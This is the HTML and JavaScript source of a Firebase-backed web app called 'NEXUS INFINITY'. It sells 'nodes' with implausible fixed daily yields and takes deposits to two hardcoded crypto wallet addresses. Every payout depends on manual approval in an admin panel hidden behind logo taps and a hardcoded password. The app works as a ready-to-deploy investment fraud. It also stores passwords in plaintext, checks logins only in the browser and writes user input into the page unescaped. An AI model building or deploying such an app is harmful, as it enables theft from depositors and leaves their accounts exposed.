<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Ultimate Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #050505; --glass: rgba(12, 12, 12, 0.98); }
        body { background: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .glass-panel { background: var(--glass); backdrop-filter: blur(50px); border: 1px solid rgba(255, 0, 60, 0.2); border-radius: 35px; }
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 20px; width: 100%; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .input-dark { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 18px; padding: 18px; color: white; width: 100%; outline: none; }
        .nav-item { color: #444; text-align: center; cursor: pointer; font-size: 8px; font-weight: 800; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.5rem] flex items-center justify-center text-5xl font-black shadow-2xl animate-pulse text-white">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-xs tracking-[0.5em] text-white">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen flex flex-col justify-center p-8 hidden">
        <div id="login-ui" class="max-w-sm mx-auto w-full space-y-6 glass-panel p-10">
            <h2 class="text-xl font-black italic text-center">TERMINAL ACCESS</h2>
            <input type="text" id="l-user" placeholder="Account ID" class="input-dark">
            <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
            <button onclick="handleLogin()" class="btn-master">Authorize</button>
            <p onclick="toggleAuth(true)" class="text-center text-[9px] text-zinc-500 uppercase cursor-pointer">Register New Identity</p>
        </div>
        <div id="signup-ui" class="max-w-sm mx-auto w-full space-y-6 glass-panel p-10 hidden">
            <h2 class="text-xl font-black italic text-center">INITIALIZE NODE</h2>
            <input type="text" id="s-user" placeholder="Create ID" class="input-dark">
            <input type="password" id="s-pass" placeholder="Create Key" class="input-dark">
            <button onclick="handleSignup()" class="btn-master">Finalize</button>
            <p onclick="toggleAuth(false)" class="text-center text-[9px] text-zinc-500 uppercase cursor-pointer">Return to Terminal</p>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/90 backdrop-blur-3xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10 shadow-lg">N</div>
            <div class="text-center">
                <span id="nav-user" class="text-[10px] font-black text-[#ff003c] uppercase">...</span>
                <p class="text-[7px] text-green-500 font-bold uppercase tracking-widest">Grid Active</p>
            </div>
            <button onclick="logout()" class="text-zinc-600"><i class="fa-solid fa-power-off"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-950 to-black overflow-hidden relative">
                <p class="text-[8px] font-black text-zinc-500 uppercase mb-1">Total Institutional Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 grid grid-cols-2 gap-4 border-t border-white/5 pt-6">
                    <div><p class="text-[7px] text-zinc-500 uppercase font-black">Yield Accumulation</p><p id="profit-txt" class="text-lg font-black text-[#ff00ff]">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 uppercase font-black">Active Nodes</p><p id="active-nodes-count" class="text-lg font-black text-blue-500">0</p></div>
                </div>
            </div>

            <div class="space-y-4">
                <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-widest ml-2">Deployed Infrastructure</h3>
                <div id="active-nodes-list" class="grid gap-3"></div>
            </div>
        </div>

        <div id="page-nodes" class="p-6 space-y-4 hidden">
            <h3 class="text-xl font-black italic text-[#ff003c] uppercase">Node Core Market</h3>
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-lg font-black italic text-[#ff003c] uppercase">Capital Injection</h3>
                <div class="space-y-2 text-[9px] font-bold text-zinc-400 uppercase">
                    <div class="bg-black/50 p-4 rounded-2xl flex justify-between"><span>Binance USDT</span><span class="text-pink-500 select-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</span></div>
                    <div class="bg-black/50 p-4 rounded-2xl flex justify-between"><span>Meta ETH</span><span class="text-blue-500 select-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</span></div>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-dark">
                <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 file:bg-zinc-800 file:border-0 file:rounded-full file:px-4 file:py-2">
                <img id="preview-img" class="mt-2 w-full h-32 rounded-xl border border-white/10 hidden object-cover">
                <button onclick="submitDep()" class="btn-master">Submit Protocol</button>
            </div>
            
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Request Payout</h3>
                <input type="text" id="w-addr" placeholder="Destination Address" class="input-dark">
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-dark">
                <button onclick="submitWith()" class="btn-master !bg-zinc-900">Queue Payout</button>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/90 backdrop-blur-3xl border-t border-white/5 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-house-signal text-xl"></i><p>CORE</p></div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><p>MARKET</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-vault text-xl"></i><p>VAULT</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-white/5 pb-4">
            <h2 class="text-xl font-black italic text-[#ff003c]">ADMIN CONTROL CENTER</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div class="space-y-8" id="admin-requests"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // NODE MARKET CONFIG
        const marketNodes = [
            { id: 1, title: "S-10 Node", price: 10, daily: 1, days: 30, tier: 'Standard' },
            { id: 2, title: "S-50 Node", price: 50, daily: 6, days: 30, tier: 'Standard' },
            { id: 3, title: "Apex Elite X", price: 500, daily: 75, days: 45, tier: 'Elite' }
        ];

        window.onload = () => {
            renderMarket();
            setTimeout(() => {
                document.getElementById('splash').classList.add('hidden');
                const user = localStorage.getItem('nexus_user');
                if(user) showDashboard(user);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderMarket() {
            document.getElementById('nodes-market').innerHTML = marketNodes.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.tier === 'Elite' ? 'border-[#ff003c]' : ''}">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 uppercase">${n.tier}</p>
                        <h4 class="text-lg font-black italic tracking-tighter">${n.title}</h4>
                        <p class="text-[9px] font-bold text-green-500">Yield: $${n.daily}/Day • ${n.days} Days</p>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="bg-white text-black px-4 py-2 rounded-xl text-[8px] font-black uppercase mt-1">Deploy</button>
                    </div>
                </div>`).join('');
        }

        // --- BUY NODE LOGIC ---
        window.buyNode = async (nodeId) => {
            const user = localStorage.getItem('nexus_user');
            const node = marketNodes.find(n => n.id === nodeId);
            const snap = await get(ref(db, `users/${user}`));
            const data = snap.val();

            if((data.balance || 0) < node.price) return alert("Insufficient Capital for Node Deployment!");

            const newBalance = data.balance - node.price;
            const nodeRef = push(ref(db, `users/${user}/activeNodes`));
            const startTime = Date.now();
            
            await update(ref(db, `users/${user}`), { balance: newBalance });
            await set(nodeRef, { ...node, startTime, lastClaim: startTime, expires: startTime + (node.days * 24 * 60 * 60 * 1000) });
            alert(`${node.title} Successfully Deployed!`);
            switchPage('home');
        };

        // --- PROFIT AUTO-CLAIM & TIMER LOGIC ---
        function updateNodesUI(user, nodes) {
            if(!nodes) {
                document.getElementById('active-nodes-list').innerHTML = '<p class="text-center text-[10px] opacity-20 uppercase font-black py-10">No Active Infrastructure</p>';
                document.getElementById('active-nodes-count').innerText = "0";
                return;
            }
            const nodesArr = Object.entries(nodes);
            document.getElementById('active-nodes-count').innerText = nodesArr.length;
            
            document.getElementById('active-nodes-list').innerHTML = nodesArr.map(([key, n]) => {
                const now = Date.now();
                const remaining = Math.max(0, n.expires - now);
                const days = Math.floor(remaining / (24 * 60 * 60 * 1000));
                const hours = Math.floor((remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000));
                
                // Auto Profit Claim (Simple logic: if 24h passed since last claim)
                const timeDiff = now - (n.lastClaim || n.startTime);
                if(timeDiff >= 24 * 60 * 60 * 1000) {
                    const daysPassed = Math.floor(timeDiff / (24 * 60 * 60 * 1000));
                    const totalProfit = daysPassed * n.daily;
                    update(ref(db, `users/${user}`), { profit: (balanceData.profit || 0) + totalProfit });
                    update(ref(db, `users/${user}/activeNodes/${key}`), { lastClaim: now });
                }

                return `
                    <div class="glass-panel p-5 border-l-4 border-blue-500">
                        <div class="flex justify-between items-start">
                            <div><h4 class="text-xs font-black italic uppercase">${n.title}</h4><p class="text-[10px] text-zinc-500">Yield: $${n.daily}/day</p></div>
                            <div class="text-right"><p class="text-[9px] font-black text-blue-500 animate-pulse">RUNNING</p><p class="text-[8px] text-zinc-400 font-bold mt-1">${days}D ${hours}H REMAINING</p></div>
                        </div>
                    </div>`;
            }).join('');
        }

        // --- ADMIN SYSTEM WITH REJECT ---
        window.loadAdmin = () => {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4">
                        <div class="flex justify-between items-center"><span class="text-[10px] font-black text-[#ff003c] uppercase">${l.type} Request</span><span class="text-[9px] text-zinc-600">${l.date}</span></div>
                        <p class="text-xs">User: <span class="font-black text-white italic">${l.user}</span> | Amount: <span class="text-green-500 font-black">$${l.amount}</span></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-40 rounded-2xl object-cover border border-white/10" onclick="window.open(this.src)">` : `<p class="text-[10px] text-zinc-500">Address: ${l.address}</p>`}
                        <div class="grid grid-cols-2 gap-3 pt-2">
                            <button onclick="processRequest('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600 py-3 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="processRequest('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600 py-3 rounded-xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`).join('') : '<p class="text-center text-xs opacity-20 uppercase font-black py-20">Secure: No Pending Actions</p>';
            });
        };

        window.processRequest = async (adminKey, user, amount, historyKey, action) => {
            if(action === 'approve') {
                const snap = await get(ref(db, `users/${user}`));
                const currentBalance = snap.val().balance || 0;
                await update(ref(db, `users/${user}`), { balance: currentBalance + parseFloat(amount) });
                await update(ref(db, `users/${user}/history/${historyKey}`), { status: 'Approved' });
            } else {
                await update(ref(db, `users/${user}/history/${historyKey}`), { status: 'Rejected' });
            }
            await remove(ref(db, `admin/requests/${adminKey}`));
            alert(`Protocol ${action === 'approve' ? 'Authorized' : 'Denied'}!`);
        };

        // --- CORE FUNCTIONS (Login, UI, etc) ---
        let balanceData = {};
        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                balanceData = snap.val(); if(!balanceData) return;
                document.getElementById('balance-txt').innerText = '$' + (balanceData.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (balanceData.profit || 0).toLocaleString();
                updateNodesUI(uid, balanceData.activeNodes);
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof) return alert("All Fields Required!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry);
            await set(ref(db, `admin/requests/${hRef.key}`), entry);
            alert("Deposit Logged!");
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user');
            const addr = document.getElementById('w-addr').value;
            const amt = document.getElementById('w-amt').value;
            if(!addr || !amt) return alert("Enter details!");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, address: addr, status: 'pending', date: new Date().toLocaleString(), type: 'Withdrawal', hKey: hRef.key };
            await set(hRef, entry);
            await set(ref(db, `admin/requests/${hRef.key}`), entry);
            alert("Withdrawal Logged!");
        };

        // Base64
        document.getElementById('dep-proof').onchange = (e) => {
            const reader = new FileReader(); reader.readAsDataURL(e.target.files[0]);
            reader.onload = () => { document.getElementById('preview-img').src = reader.result; document.getElementById('preview-img').classList.remove('hidden'); };
        };

        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home', 'nodes', 'vault'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); alert("Initialized!"); toggleAuth(false); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(); const snap = await get(ref(db, `users/${u}`)); if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Denied!"); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
